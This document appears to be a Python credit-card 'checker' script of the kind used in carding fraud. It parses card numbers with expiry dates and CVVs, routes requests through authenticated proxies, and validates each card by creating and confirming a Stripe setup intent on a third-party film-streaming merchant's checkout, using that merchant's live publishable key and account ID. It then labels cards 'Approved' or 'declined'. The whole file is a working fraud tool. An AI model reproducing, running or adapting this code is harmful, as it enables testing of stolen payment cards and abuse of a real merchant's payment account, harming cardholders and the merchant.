import requests, re, random
from typing import List

def create_lista(text: str):
    m = re.findall(r'\d{15,16}(?:/|:|\|)\d+(?:/|:|\|)\d{2,4}(?:/|:|\|)\d{3,4}', text)
    lis = list(filter(lambda num: num.startswith(("5", "4", "3", "6")), [*set(m)]))
    return [xx.replace("/", "|").replace(":", "|") for xx in lis]

def get_proxies(proxies: List[str] = [], proxy_type: str = "http"):
    try:
        file = random.choice(proxies)
        host, port, user, pas = file.split(":")[:4]
        return {
            "proxies": {
                'http': f'{proxy_type}://{user}:{pas}@{host}:{port}',
                'https': f'{proxy_type}://{user}:{pas}@{host}:{port}'
            }
        }
    except Exception as e:
        return {"error": str(e)}

def main(card, proxy=None):
    try:
        cards = create_lista(card)
        if not cards:
            return {'status': 'declined', 'message': '❌ Invalid format. Use CC|MM|YY|CVV'}

        cc, mes, ano, cvv = cards[0].split("|")[:4]
        proxy_dict = get_proxies([proxy]).get('proxies', None) if proxy else None

        with requests.Session() as session:
            if proxy_dict:
                session.proxies = proxy_dict

            # Setup Intent Request
            r1 = session.get(
                'https://filmsforchange.stream/api/billings/setup_intent',
                headers={
                    'referer': 'https://filmsforchange.stream/checkout/new?o=207372',
#                    'x-csrf-token': '6kpVvDmBac_mPOXvAZMfqVaY9kocQunlOpA72PoqItXnNOlRAGU2bio9a554NoJQGo2u_KVCWRi59lWz48SVFA'
                },
                params={'page': 'checkouts'},
            )

            if r1.status_code != 200:
                return {'status': 'declined', 'message': f'❌ Setup intent fetch failed: HTTP {r1.status_code}'}

            setup_intent = r1.json().get("setup_intent")
            if not setup_intent or "_secret_" not in setup_intent:
                return {'status': 'declined', 'message': '❌ Setup intent missing or malformed'}

            seti_id = setup_intent.split("_secret_")[0]

            # Confirm Setup Intent
            payload = (
                f'return_url=https://filmsforchange.stream/checkout/success?o=207372'
                f'&payment_method_data[type]=card'
                f'&payment_method_data[card][number]={cc}'
                f'&payment_method_data[card][cvc]={cvv}'
                f'&payment_method_data[card][exp_year]={ano}'
                f'&payment_method_data[card][exp_month]={mes}'
                f'&payment_method_data[billing_details][address][country]=PK'
                f'&payment_method_data[muid]=b7e8e304-3dda-4944-93ad-69410038d7ed426a25'
                f'&payment_method_data[sid]=7320f577-fa95-4e03-9fab-61fcf2f1a8062d0be5'
                f'&payment_method_data[guid]=3f309fe3-7fa7-4e16-b2bb-70aac4788d43a51f83'
                f'&expected_payment_method_type=card'
                f'&client_context[currency]=aud'
                f'&client_context[mode]=subscription'
                f'&client_context[setup_future_usage]=off_session'
                f'&use_stripe_sdk=true'
                f'&key=pk_live_DImPqz7QOOyx70XCA9DSifxb'
                f'&_stripe_account=acct_1GYWHOFZgpejlP1R'
                f'&client_secret={setup_intent}'
            )

            r2 = session.post(
                f'https://api.stripe.com/v1/setup_intents/{seti_id}/confirm',
                headers={
                    'content-type': 'application/x-www-form-urlencoded',
                    'origin': 'https://js.stripe.com',
                    'referer': 'https://js.stripe.com/',
                },
                data=payload,
            )

            res_json = r2.json()
            if r2.status_code != 200:
                return {'status': 'declined', 'message': f"❌ Stripe Error: {res_json.get('error', {}).get('message', 'Unknown error')}"}

            if res_json.get("status") == "succeeded":
                return {'status': 'succeeded', 'message': 'Approved ✅', 'stripe_id': res_json.get("id")}

            return {'status': 'declined', 'message': res_json.get('error', {}).get('message', '❌ Unknown card error')}

    except requests.exceptions.ProxyError:
        return {'status': 'declined', 'message': '❌ Proxy failed'}

    except Exception as err:
        return {'status': 'declined', 'message': f'❌ Exception: {str(err)}'}
